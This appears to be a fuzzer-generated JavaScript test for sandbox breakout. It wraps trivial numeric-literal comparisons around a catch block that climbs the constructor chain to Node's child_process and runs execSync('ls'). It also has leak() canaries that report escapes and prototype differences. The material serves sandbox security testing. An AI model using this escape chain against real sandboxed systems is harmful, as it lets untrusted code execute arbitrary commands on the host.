try {
    if (0 !== 0) {
        $ERROR('#0: 0.0e1 === 0');
    }
    if (11 !== 11) {
        $ERROR('#1: 1.1e1 === 11');
    }
    if (22 !== 22) {
        $ERROR('#2: 2.2e1 === 22');
    }
    if (33 !== 33) {
        $ERROR('#3: 3.3e1 === 33');
    }
    if (44 !== 44) {
        $ERROR('#4: 4.4e1 === 44');
    }
    if (55 !== 55) {
        $ERROR('#5: 5.5e1 === 55');
    }
    if (66 !== 66) {
        $ERROR('#6: 6.e1 === 66');
    }
    if (77 !== 77) {
        $ERROR('#7: 7.7e1 === 77');
    }
    if (88 !== 88) {
        $ERROR('#8: 8.8e1 === 88');
    }
    if (99 !== 99) {
        $ERROR('#9: 9.9e1 === 99');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}